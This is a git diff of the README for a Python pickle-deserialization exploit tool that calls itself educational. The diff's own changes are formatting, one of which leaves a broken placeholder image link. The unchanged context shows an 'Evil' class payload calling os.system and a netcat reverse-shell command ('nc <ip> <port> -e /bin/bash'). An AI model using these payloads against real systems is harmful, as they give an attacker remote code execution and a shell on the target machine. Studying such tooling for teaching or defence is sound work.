@@ -22,6 +22,7 @@ This program is primarily for educational purposes, aiming to provide insights i
 ## **Usage**
 ### **1. Serialization**
 Run the `serializer.py` script to generate a malicious payload:
+
 ```
 python serializer.py
 ```
@@ -38,17 +39,22 @@ The default payload executes the `whoami` command. To change the command:
 
 1. Open `serializer.py`.
 2. Modify the `return (os.system, ("whoami",))` line in the `Evil` class:
+   
    ```
    return (os.system, ("<your_command>",))
    ```
 3. For a reverse shell, you can use:
+   
    ```
    return (os.system, ("nc <ip> <port> -e /bin/bash",))
    ```
 
 ## Example of use via terminal in kali linux (in this case, without venv):
 
-![image](https://github.com/user-attachments/assets/fda334c0-a684-496f-8185-c6ea203e89fc)
+<div align="center">
+  <img src="[URL_DA_IMAGEM](https://github.com/user-attachments/assets/fda334c0-a684-496f-8185-c6ea203e89fc)" width="300">
+</div>
+
 
 
 ## **Warnings**
